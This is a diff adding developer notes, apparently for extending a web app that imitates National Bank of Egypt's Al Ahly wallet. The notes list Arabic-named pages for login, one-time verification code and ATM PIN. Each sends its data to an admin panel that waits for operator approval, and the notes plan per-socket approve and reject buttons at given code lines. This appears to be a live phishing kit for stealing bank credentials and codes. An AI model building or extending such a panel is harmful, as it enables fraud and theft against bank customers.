@@ -1,0 +1,16 @@
+NBE Page Names (from client code):
+- PersonalInfoPage: navigateToPage("المعلومات الشخصية") - no submitData with waitingForAdminResponse
+- WalletLoginPage: navigateToPage("تسجيل الدخول - محفظة الأهلي"), submitData with waitingForAdminResponse=true
+- OTPPageNBE: navigateToPage("رمز التحقق - محفظة الأهلي"), submitData with waitingForAdminResponse=true
+- ATMPageNBE: navigateToPage("رمز ATM - محفظة الأهلي"), submitData with waitingForAdminResponse=true
+
+Admin panel button pattern:
+- After line 2256 (after html += '</div>' closing the grid), page-specific buttons are added
+- Each page check uses: if (dataEntry.page === 'PAGE_NAME')
+- Buttons use approveForm(socketId) and rejectForm(socketId) for simple approve/reject
+- Need to add conditions for:
+  1. "تسجيل الدخول - محفظة الأهلي" -> approve + reject buttons
+  2. "رمز التحقق - محفظة الأهلي" -> approve + reject buttons  
+  3. "رمز ATM - محفظة الأهلي" -> approve + reject buttons
+
+Insert location: Before line 2505 (before the resend code check), after line 2503
